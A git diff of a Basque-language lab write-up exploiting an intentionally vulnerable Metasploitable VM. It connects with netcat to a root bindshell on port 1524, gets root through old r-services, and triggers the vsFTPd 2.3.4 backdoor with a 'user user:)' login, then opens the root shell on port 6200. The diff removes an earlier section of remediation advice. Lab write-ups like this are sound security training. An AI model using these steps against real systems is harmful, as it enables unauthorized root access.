@@ -192,7 +192,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 # Ahultasunak
 
-1524 portuan root shell-a dela esaten du(1524/tcp  open  bindshell   Metasploitable root shell), ondorioz, netcat egingo diogu portuari
+`nmap -sCV` emaitzan argi ikusten da 1524 portuan root bindshell bat dagoela (`1524/tcp  open  bindshell   Metasploitable root shell`).
+Hori egiaztatzeko, `netcat` bidez zuzenean konektatu gara.
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -201,9 +202,11 @@ root@metasploitable:/# whoami
 root
 ```
 
-Beste portu bertsio guztiak begiratu interneten 
 
-- 512, 513, 514 portuak zerbitzu zaharrak dituzte eta batzutan ez dute pazahitza eskatzen.
+
+Ondoren, irekitako beste zerbitzuen bertsioak berrikusi ditugu ahultasun ezagunak bilatzeko.
+
+- 512, 513 eta 514 portuek `r` zerbitzu zaharrak erabiltzen dituzte, eta konfigurazio ahuletan pasahitzik gabe sartzea posible izan daiteke.
 ```
                                                                                                                                                              
 ┌──(kali㉿kali)-[~]
@@ -226,7 +229,7 @@ root
 root@metasploitable:~# 
 ```
 
-- 21 portua ahultasun bat du, 
+- 21 portuan `vsFTPd 2.3.4` agertzen da; bertsio hori backdoor ahultasunarekin lotuta dago.
 ```
 ┌──(kali㉿kali)-[~]
 └─$ nc 10.0.2.4 21
@@ -236,62 +239,13 @@ user user:)
 PASS 12345 
 ```
 
-hau egin eta gero beste terminal batean
+Hori egin ondoren, beste terminal batean 6200 portura konektatu gara emaitza egiaztatzeko:
 ```
 ┌──(kali㉿kali)-[~]
 └─$ nc 10.0.2.4 6200
 whoami
 root
-```
 
-# Galderen erantzuna (prozedura berdina erabilita)
 
-## 1) 1524/tcp - bindshell root
-
-### Zer informazio lortu dugu eta zergatik da ahultasuna?
-- `nmap -sCV`-n agertzen da: `1524/tcp open bindshell Metasploitable root shell`.
-- Hau kritikoa da, portura konektatze hutsarekin shell bat ematen duelako.
-
-### Nola ustiatu dugu?
-```
-nc 10.0.2.4 1524
-whoami
-```
-
-### Emaitza
-- `root` jaso dugu zuzenean.
-- Zerbitzariaren kontrol osoa lortu da.
-
-### Gomendioak
-- Zerbitzu hori desgaitu eta startup-etik kendu.
-- Portu 1524 firewall bidez itxi.
-- Sarbidea segmentazioz mugatu (VPN edo admin host jakin batetik bakarrik).
-
-## 2) 21/tcp - vsFTPd 2.3.4 backdoor
-
-### Zer informazio lortu dugu eta zergatik da ahultasuna?
-- `nmap`-ek `vsftpd 2.3.4` erakusten du 21 portuan.
-- Proban ikusi da `user user:)` bidali ondoren 6200 portuan root shell-a irekitzen dela.
-
-### Nola ustiatu dugu?
-```
-nc 10.0.2.4 21
-user user:)
-```
-
-Ondoren:
 
 ```
-nc 10.0.2.4 6200
-whoami
-```
-
-### Emaitza
-- Root shell-a ireki da.
-- Urrunetik root baimenak lortu dira.
-
-### Gomendioak
-- vsFTPd 2.3.4 kendu eta bertsio segurura eguneratu.
-- FTP desgaitu edo SFTP-ra migratu.
-- 21 eta 6200 portuak itxi edo mugatu firewall bidez.
-- Auditoretza eta monitorizazioa aktibatu (log susmagarriak detektatzeko).
